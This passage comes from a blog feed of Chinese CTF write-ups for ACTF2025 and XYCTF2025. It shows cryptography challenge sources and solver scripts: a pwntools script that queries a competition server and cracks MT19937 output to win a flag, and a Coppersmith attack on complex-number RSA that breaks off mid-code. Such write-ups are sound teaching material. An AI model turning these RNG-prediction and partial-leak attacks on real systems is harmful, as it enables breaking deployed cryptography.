class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, bytes_to_long, isPrime</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> namedtuple</span><br><span class="line"><span class="keyword">from</span> signal <span class="keyword">import</span> alarm</span><br><span class="line"></span><br><span class="line">Point = namedtuple(<span class="string">&quot;Point&quot;</span>, <span class="string">&quot;x y&quot;</span>)</span><br><span class="line">O = <span class="string">&quot;Origin&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">point_addition</span>(<span class="params">P, Q, n</span>):</span><br><span class="line"><span class="keyword">if</span> P == O:</span><br><span class="line"><span class="keyword">return</span> Q</span><br><span class="line"><span class="keyword">if</span> Q == O:</span><br><span class="line"><span class="keyword">return</span> P</span><br><span class="line">x = (P.x * Q.y + P.y * Q.x - P.x * Q.x) % n</span><br><span class="line">y = (P.x * Q.x + P.y * Q.y) % n</span><br><span class="line"><span class="keyword">return</span> Point(x, y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">double_and_add</span>(<span class="params">k, P, n</span>):</span><br><span class="line">Q = P</span><br><span class="line">R = O</span><br><span class="line"><span class="keyword">while</span>(k &gt; <span class="number">0</span>):</span><br><span class="line"><span class="keyword">if</span> k &amp; <span class="number">1</span>:</span><br><span class="line">R = point_addition(R, Q, n)</span><br><span class="line">k &gt;&gt;= <span class="number">1</span></span><br><span class="line">Q = point_addition(Q, Q, n)</span><br><span class="line"><span class="keyword">return</span> R</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">flag = f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) == <span class="number">50</span></span><br><span class="line">flag = urandom(randint(<span class="number">38</span>, <span class="number">48</span>)) + flag</span><br><span class="line">flag = flag + urandom(<span class="number">118</span> - <span class="built_in">len</span>(flag))</span><br><span class="line"></span><br><span class="line">flag1, flag2 = bytes_to_long(flag[:<span class="number">68</span>]), bytes_to_long(flag[<span class="number">68</span>:])</span><br><span class="line"></span><br><span class="line">n = <span class="number">0x231d5fa471913e79facfd95e9b874e2d499def420e0914fab5c9f87e71c2418d1194066bd8376aa8f02ef35c1926f73a46477cd4a88beae89ba575bb3e1b04271426c6706356dd8cd9aa742d7ad0343f8939bfd2110d45122929d29dc022da26551e1ed7000</span></span><br><span class="line">G1 = Point(<span class="number">0xf22b9343408c5857048a19150c8fb9fd44c25d7f6decabc10bf46a2250a128f0df15adc7b82c70c0acaf855c0e898b141c9c94ba8aef8b67ea298c6d9fd870ea70e1c4f8a1b595d15373dc6db25a4ecddf626a64f47beba5538b7f733e4aa0c4f1fd4c291d</span>, <span class="number">0x8d3264514b7fdbce97fbaedb33120c7889a1af59691a1947c2c7061347c091b0950ca36efaa704514004a988b9b87b24f5cebf2d1c7bef44ff172519e1a62eb62cde234c94bd0ab39375d7ddb42e044090c8db46d3f965ef7e4753bc41dac3b8b3ae0cdb57</span>)</span><br><span class="line">G2 = Point(<span class="number">0x81919777837d3e5065c6f7f6801fe29544180be9db2137f075f53ebb3307f917183c6fc9cdfc5d75977f7</span>, <span class="number">0xd1a586d6848caa3a5436a86d903516d83808ce2fa49c5fb3f183ecb855e961c7e816a7ba8f588ef947f19</span>)</span><br><span class="line"></span><br><span class="line">f1 = double_and_add(flag1, G1, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(f1)</span><br><span class="line"></span><br><span class="line">alarm(<span class="number">30</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> flag1 != <span class="built_in">int</span>(<span class="built_in">input</span>()):</span><br><span class="line">exit()</span><br><span class="line"></span><br><span class="line">p = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> isPrime(p) <span class="keyword">and</span> p.bit_length() == <span class="number">400</span></span><br><span class="line"></span><br><span class="line">f2 = double_and_add(flag2, G2, p)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(f2)</span><br></pre></td></tr></table></figure><h2 id="AAALLL"><a href="#AAALLL" class="headerlink" title="AAALLL*"></a>AAALLL*</h2><blockquote><p>Let’s welcome AAA’s LLL master!</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choice, sample</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sample_ternery_poly</span>(<span class="params">Q</span>):</span><br><span class="line">    <span class="keyword">return</span> Q([choice([-<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>]) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(Q.degree())])</span><br><span class="line"></span><br><span class="line">n = <span class="number">450</span></span><br><span class="line">p = <span class="number">3774877201</span></span><br><span class="line">t = n//<span class="number">2</span></span><br><span class="line"></span><br><span class="line">P.&lt;x&gt; = PolynomialRing(GF(p))</span><br><span class="line">g = x^n+<span class="number">1</span></span><br><span class="line">roots = [i[<span class="number">0</span>] <span class="keyword">for</span> i <span class="keyword">in</span> g.roots()]</span><br><span class="line"></span><br><span class="line">subset = sample(roots, t)</span><br><span class="line"></span><br><span class="line">Q.&lt;x&gt; = P.quotient(x^n+<span class="number">1</span>)</span><br><span class="line">f = sample_ternery_poly(Q)</span><br><span class="line">f_lift = f.lift()</span><br><span class="line">values = [f_lift(i) <span class="keyword">for</span> i <span class="keyword">in</span> subset]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;subset: <span class="subst">&#123;subset&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;values: <span class="subst">&#123;values&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">key = md5(<span class="built_in">str</span>(f.<span class="built_in">list</span>()).encode()).digest()</span><br><span class="line">aes = AES.new(key = key, mode = AES.MODE_ECB)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;ct: <span class="subst">&#123;aes.encrypt(pad(flag, <span class="number">16</span>))&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">subset: [1040018022, 3719840057, 2086762603, 3065369513, 3179320758, 891114580, 966265556, 664146925, 1232096603, 1449704729, 2810118429, 2891821810, 698162894, 3070228878, 3114653287, 2793650430, 2941920517, 1811454265, 325024118, 1860481904, 555392385, 2818572232, 3719972491, 981226771, 1777524396, 2717373523, 3694549306, 91210020, 1397236365, 2806262125, 1966653548, 1369610707, 3545263790, 595556443, 1601356313, 2865921937, 2795518764, 1690002428, 3501122295, 2078440315, 1222414863, 1997352805, 271758023, 3348936352, 1800648013, 410072905, 3378691273, 185134810, 1281817316, 821730517, 2855781188, 3353349707, 273754906, 1187616168, 569728457, 401428606, 3671298095, 149603298, 2300569286, 1057503678, 1915386614, 2716934671, 2005635066, 389589525, 2691165686, 586877133, 2874838, 660954102, 3258633701, 1083711515, 1785913794, 3410290851, 1914395297, 2544074509, 3076714307, 2169463229, 2654223166, 3648299978, 3188000068, 1130206965, 875184747, 2549126013, 3602874619, 80327895, 983400559, 2423201604, 3384400899, 654136379, 1835112234, 3302809337, 3388376496, 364586350, 3219484816, 52162306, 3488542302, 2843511894, 638341256, 427235375, 757491483, 3364804296, 172002582, 3112473265, 2746078509, 2118542465, 421527494, 3017385718, 3683667181, 3536621837, 3113923099, 1989065494, 1769242135, 1541932517, 1963422936, 2341204092, 3306256995, 186750428, 1381468653, 1288011784, 229613411, 839241230, 425544589, 2345390466, 2552462338, 286334899, 2984993503, 3741109364, 103579106, 138703348, 2369990075, 2377640836, 1279106009, 2542780598, 1653097443, 3373448595, 2405266494, 3385287676, 289622793, 2376573706, 3096235437, 1971476669, 3449853083, 3565565810, 762810383, 272826480, 516243500, 1710511548, 3233762177, 2013126070, 224313638, 1884110819, 3141861971, 2014729696, 1572103482, 2232944684, 2644670236, 1350302342, 3589742391, 2106163918, 1077036824, 3527373372, 2474464298, 971863088, 1219963894, 3349332612, 1474307915, 905651245, 2666266327, 2192845472, 2748042118, 1489782942, 1300412903, 126577223, 545427793, 360417066, 704648323, 3562938536, 908955264, 1108610874, 247503829, 2379959160, 1059927520, 2869225956, 2202773719, 1498564318, 2032958616, 3485254408, 1091224495, 3287849020, 780873181, 3410363615, 1398303495, 2426564739, 487028181, 1230802692, 139226346, 789883698, 2557862280, 2994004020, 3205148744, 2914199937, 1803400532, 2738281702, 883055391, 1761751131, 1220550272, 1947825121, 3543565567, 1939764967, 2986882625, 798323428, 1120654035, 3722714895, 3679983602, 364513586, 1760147505, 472067864, 2393408548, 2239781327, 799334306, 3497260623, 2769084221, 860677264, 990410164, 3772002363, 2883762621]</span></span><br><span class="line"><span class="string">values: [712538976, 1225537965, 2633482204, 1245652635, 2529155164, 1672980719, 3024410928, 1535384351, 2252244320, 672919726, 2976916118, 3089453551, 2512277279, 2431400831, 1129198075, 3441247454, 610984549, 2043949242, 3306515233, 2759625250, 2459507335, 2885552592, 3226187015, 983312810, 1815610133, 871259259, 3651562935, 570267317, 2548725905, 70380481, 685470168, 1925389996, 2466124957, 1512923993, 2603725653, 409457162, 859041441, 3193931087, 786021320, 2481319115, 2379423262, 1972220678, 251474531, 448830331, 3189297419, 845468707, 3014186402, 1476144624, 1412175603, 464556671, 1251535251, 2252149066, 3501165225, 1173484383, 1168113959, 2547845342, 3132683037, 182880838, 3236782773, 637440805, 1077834200, 910992912, 1281164705, 763525563, 1025793488, 3031918542, 2457090411, 159146268, 3252417067, 1695150089, 1863899429, 2660689081, 647461624, 3736679821, 2034134877, 973654854, 1545264273, 692989149, 769387639, 2024000598, 2916906076, 1996631367, 2889527392, 527082343, 3319918691, 3629378248, 685639382, 2659312228, 472574946, 1237496521, 434512296, 3649895972, 3500730074, 1092276151, 1513927060, 1179642291, 474879861, 1132457849, 3072787035, 1536862618, 3131879287, 1635514910, 2467715064, 2377496874, 2888951190, 3697148067, 1885811970, 1037114846, 2862197847, 2248493059, 829223452, 17390497, 1063920331, 2504310664, 2269937803, 667770896, 1855657371, 323906741, 2972650844, 3620395133, 2613325861, 2508686438, 2143229100, 977352912, 3380653143, 2367018411, 1665354812, 2473914413, 3531805346, 2023595772, 1909192693, 844059686, 2233570033, 1997039839, 3558799006, 2872633369, 1949018254, 3159312415, 3021409934, 2505867881, 2357897866, 3436059930, 1496867815, 594001374, 3433203342, 2396280741, 2696363547, 1775021594, 434891096, 862244228, 1372573410, 3003385341, 3051290794, 493688483, 2143128679, 394087901, 3668481745, 1085467544, 2438896216, 1782052147, 2415529482, 149721114, 1539904401, 1902915995, 1929333694, 1759980967, 2106193398, 3670877657, 2736025727, 3133082490, 182590224, 1099952929, 3522052498, 2206338880, 1925988633, 3440533747, 25471854, 325651518, 72348028, 3178620735, 3335468600, 818634602, 2932340363, 1163855672, 2453716531, 373827915, 2373018915, 2231504345, 2975884007, 3636085022, 2354093635, 2696203979, 799834661, 2412088324, 1446875965, 3299868618, 302142905, 1957341475, 1522953201, 1257060525, 3769499753, 1591149900, 295691418, 3249943297, 1280379656, 1164820140, 115871117, 219831260, 2505969457, 2618672354, 2781617927, 2886486193, 1648555579, 1265576372, 1720183485, 2424145699, 2772052592, 2399827477, 626825210, 2422432913, 322266950, 2157976175, 2208875362, 2216568965, 3223085486]</span></span><br><span class="line"><span class="string">ct: b&#x27;&quot;\xf2Y\xf0\x15\xc5x\x94\xb9E\xbd\xd3\xa7\xb1\xad\x00\xa2D*+\x87BQ_20\x87\xa2\nP\xfc\xce\x0eW\xaf\xd8-.\xb5\xfai\xf1\xf6*\xben^\xd5&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><ul><li><a href="https://blog.xmcve.com/2025/04/27/ACTF2025-Writeup">星盟</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Misc&quot;&gt;&lt;a href=&quot;#Misc&quot; class=&quot;headerlink&quot; title=&quot;Misc&quot;&gt;&lt;/a&gt;Misc&lt;/h1&gt;&lt;h2 id=&quot;signin&quot;&gt;&lt;a href=&quot;#signin&quot; class=&quot;headerlink&quot; title=&quot;signi</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>XYCTF2025-WriteUp</title>
    <link href="https://hvang10.github.io/2025/04/08/XYCTF2025-WriteUp/"/>
    <id>https://hvang10.github.io/2025/04/08/XYCTF2025-WriteUp/</id>
    <published>2025-04-07T19:19:43.000Z</published>
    <updated>2025-04-07T19:57:44.085Z</updated>
    
    <content type="html"><![CDATA[<p><strong>*代表未解决，可能是卡了，也可能是没思路了，简单做个记录，然后跑了，再或者是后续没来得及复现，在此处留个坑，等以后回来填上……</strong></p><p><a href="https://gz.imxbt.cn/games/23">复现网址</a></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Division"><a href="#Division" class="headerlink" title="Division"></a>Division</h2><blockquote><p>LamentXU学不明白除法了，能教教我吗？（adwa这个骗人的大坏蛋&gt;_&lt;，这个才是签到啊）</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    :   server.py</span></span><br><span class="line"><span class="string">@Time    :   2025/03/20 12:25:03</span></span><br><span class="line"><span class="string">@Author  :   LamentXU </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> random </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;----Welcome to my division calc----&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">menu:</span></span><br><span class="line"><span class="string">      [1]  Division calc</span></span><br><span class="line"><span class="string">      [2]  Get flag</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    choose = <span class="built_in">input</span>(<span class="string">&#x27;: &gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> choose == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            denominator = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;input the denominator: &gt;&gt;&gt; &#x27;</span>))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;INPUT NUMBERS&#x27;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        nominator = random.getrandbits(<span class="number">32</span>)</span><br><span class="line">        <span class="keyword">if</span> denominator == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;NO YOU DONT&#x27;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;nominator&#125;</span>//<span class="subst">&#123;denominator&#125;</span> = <span class="subst">&#123;nominator//denominator&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> choose == <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            ans = <span class="built_in">input</span>(<span class="string">&#x27;input the answer: &gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">            rand1 = random.getrandbits(<span class="number">11000</span>)</span><br><span class="line">            rand2 = random.getrandbits(<span class="number">10000</span>)</span><br><span class="line">            correct_ans = rand1 // rand2</span><br><span class="line">            <span class="keyword">if</span> correct_ans == <span class="built_in">int</span>(ans):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;WOW&#x27;</span>)</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&#x27;Here is your flag: <span class="subst">&#123;f.read()&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;NOPE, the correct answer is <span class="subst">&#123;correct_ans&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;INPUT NUMBERS&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Invalid choice&#x27;</span>)</span><br></pre></td></tr></table></figure><p><strong>MT19937</strong>，令<strong>分母</strong>为1，连续获得<strong>624轮随机数</strong>，再预测<code>rand1 rand2</code>即可得到<code>flag</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> randcrack <span class="keyword">import</span> RandCrack</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;47.94.15.198&quot;</span>, <span class="number">20491</span>)</span><br><span class="line">rc = RandCrack()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="number">624</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    a = <span class="built_in">str</span>(p.recvline().decode()).split(<span class="string">&#x27; = &#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">    rc.submit(<span class="built_in">int</span>(a))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;: &gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;: &gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">rand1 = rc.predict_getrandbits(<span class="number">11000</span>)</span><br><span class="line">rand2 = rc.predict_getrandbits(<span class="number">10000</span>)</span><br><span class="line">ans = rand1 // rand2</span><br><span class="line">p.sendline(<span class="built_in">str</span>(ans))</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Here is your flag: &#x27;</span>)</span><br><span class="line">flag = p.recvline()</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://picx.zhimg.com/80/v2-1364b443a5f502f55274afa666827bdd_1440w.png?source=d16d100b" alt=""></p><h2 id="Complex-signin"><a href="#Complex-signin" class="headerlink" title="Complex_signin"></a>Complex_signin</h2><blockquote><p>As everyone knows, a check-in challenge shouldn’t look too much like a check-in. So, this is a simple partial m leakage in RSA—but then again, it doesn’t seem like just a simple partial m leakage in RSA.</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ChaCha20</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Complex</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, re, im</span>):</span><br><span class="line">        self.re = re</span><br><span class="line">        self.im = im</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__mul__</span>(<span class="params">self, c</span>):</span><br><span class="line">        re_ = self.re * c.re - self.im * c.im</span><br><span class="line">        im_ = self.re * c.im + self.im * c.re</span><br><span class="line">        <span class="keyword">return</span> Complex(re_, im_)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__eq__</span>(<span class="params">self, c</span>):</span><br><span class="line">        <span class="keyword">return</span> self.re == c.re <span class="keyword">and</span> self.im == c.im</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__rshift__</span>(<span class="params">self, m</span>):</span><br><span class="line">        <span class="keyword">return</span> Complex(self.re &gt;&gt; m, self.im &gt;&gt; m)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__lshift__</span>(<span class="params">self, m</span>):</span><br><span class="line">        <span class="keyword">return</span> Complex(self.re &lt;&lt; m, self.im &lt;&lt; m)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> self.im == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">str</span>(self.re)</span><br><span class="line">        <span class="keyword">elif</span> self.re == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">abs</span>(self.im) == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;<span class="string">&#x27;-&#x27;</span> <span class="keyword">if</span> self.im &lt; <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span>&#125;</span>i&quot;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;self.im&#125;</span>i&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;self.re&#125;</span> <span class="subst">&#123;<span class="string">&#x27;+&#x27;</span> <span class="keyword">if</span> self.im &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;-&#x27;</span>&#125;</span> <span class="subst">&#123;<span class="built_in">abs</span>(self.im)&#125;</span>i&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">tolist</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> [self.re, self.im]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">complex_pow</span>(<span class="params">c, exp, n</span>):</span><br><span class="line">    result = Complex(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">while</span> exp &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> exp &amp; <span class="number">1</span>:</span><br><span class="line">            result = result * c</span><br><span class="line">            result.re = result.re % n</span><br><span class="line">            result.im = result.im % n</span><br><span class="line">        c = c * c</span><br><span class="line">        c.re = c.re % n</span><br><span class="line">        c.im = c.im % n</span><br><span class="line">        exp &gt;&gt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">bits = <span class="number">128</span></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line">m = Complex(getRandomRange(<span class="number">1</span>, n), getRandomRange(<span class="number">1</span>, n))</span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">c = complex_pow(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;mh = <span class="subst">&#123;(m &gt;&gt; bits &lt;&lt; bits).tolist()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;C = <span class="subst">&#123;c.tolist()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;enc = <span class="subst">&#123;ChaCha20.new(key=hashlib.sha256(<span class="built_in">str</span>(m.re + m.im).encode()).digest(), nonce=<span class="string">b&#x27;Pr3d1ctmyxjj&#x27;</span>).encrypt(flag)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 24240993137357567658677097076762157882987659874601064738608971893024559525024581362454897599976003248892339463673241756118600994494150721789525924054960470762499808771760690211841936903839232109208099640507210141111314563007924046946402216384360405445595854947145800754365717704762310092558089455516189533635318084532202438477871458797287721022389909953190113597425964395222426700352859740293834121123138183367554858896124509695602915312917886769066254219381427385100688110915129283949340133524365403188753735534290512113201932620106585043122707355381551006014647469884010069878477179147719913280272028376706421104753</span></span><br><span class="line"><span class="string">mh = [3960604425233637243960750976884707892473356737965752732899783806146911898367312949419828751012380013933993271701949681295313483782313836179989146607655230162315784541236731368582965456428944524621026385297377746108440938677401125816586119588080150103855075450874206012903009942468340296995700270449643148025957527925452034647677446705198250167222150181312718642480834399766134519333316989347221448685711220842032010517045985044813674426104295710015607450682205211098779229647334749706043180512861889295899050427257721209370423421046811102682648967375219936664246584194224745761842962418864084904820764122207293014016, 15053801146135239412812153100772352976861411085516247673065559201085791622602365389885455357620354025972053252939439247746724492130435830816513505615952791448705492885525709421224584364037704802923497222819113629874137050874966691886390837364018702981146413066712287361010611405028353728676772998972695270707666289161746024725705731676511793934556785324668045957177856807914741189938780850108643929261692799397326838812262009873072175627051209104209229233754715491428364039564130435227582042666464866336424773552304555244949976525797616679252470574006820212465924134763386213550360175810288209936288398862565142167552]</span></span><br><span class="line"><span class="string">C = [5300743174999795329371527870190100703154639960450575575101738225528814331152637733729613419201898994386548816504858409726318742419169717222702404409496156167283354163362729304279553214510160589336672463972767842604886866159600567533436626931810981418193227593758688610512556391129176234307448758534506432755113432411099690991453452199653214054901093242337700880661006486138424743085527911347931571730473582051987520447237586885119205422668971876488684708196255266536680083835972668749902212285032756286424244284136941767752754078598830317271949981378674176685159516777247305970365843616105513456452993199192823148760, 21112179095014976702043514329117175747825140730885731533311755299178008997398851800028751416090265195760178867626233456642594578588007570838933135396672730765007160135908314028300141127837769297682479678972455077606519053977383739500664851033908924293990399261838079993207621314584108891814038236135637105408310569002463379136544773406496600396931819980400197333039720344346032547489037834427091233045574086625061748398991041014394602237400713218611015436866842699640680804906008370869021545517947588322083793581852529192500912579560094015867120212711242523672548392160514345774299568940390940653232489808850407256752]</span></span><br><span class="line"><span class="string">enc = b&#x27;\x9c\xc4n\x8dF\xd9\x9e\xf4\x05\x82!\xde\xfe\x012$\xd0\x8c\xaf\xfb\rEb(\x04)\xa1\xa6\xbaI2J\xd2\xb2\x898\x11\xe6x\xa9\x19\x00pn\xf6rs- \xd2\xd1\xbe\xc7\xf51.\xd4\xd2 \xe7\xc6\xca\xe5\x19\xbe&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>复数域</strong>下的<strong>明文高位泄露</strong>，<a href="https://tangcuxiaojikuai.xyz/post/146254b2.html">去年</a>就开始玩复数了，这里的话可以打<strong>二元copper</strong>，这里也是直接套用<strong>小鸡块师傅</strong>的脚本，其实跟一元相差不大</p><p><code>bound</code>为两个根的上界，<code>m</code>为移位，<code>d</code>为多项式中的最高幂</p><p>$C\equiv(m_re+m_im<em>i)^{3}\%n$<br>$m_re=mh_re+x$<br>$m_im=mh_im+y$<br>$C_re\equiv(mh_re+x)^{3}-3</em>(mh_re+x)<em>(mh_im+y)^{2}\%n$<br>$C_im\equiv3</em>(mh_re+x)^{2}*(mh_im+y)-(mh_im+x)^{3}\%n$</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ChaCha20</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">small_roots</span>(<span class="params">f, bounds, m=<span class="number">1</span>, d=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> d:</span><br><span class="line">        d = f.degree()</span><br><span class="line"></span><br><span class="line">    R = f.base_ring()</span><br><span class="line">    N = R.cardinality()</span><br><span class="line"></span><br><span class="line">    f /= f.coefficients().pop(<span class="number">0</span>)</span><br><span class="line">    f = f.change_ring(ZZ)</span><br><span class="line"></span><br><span class="line">    G = <span class="type">Sequence</span>([], f.parent())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m + <span class="number">1</span>):</span><br><span 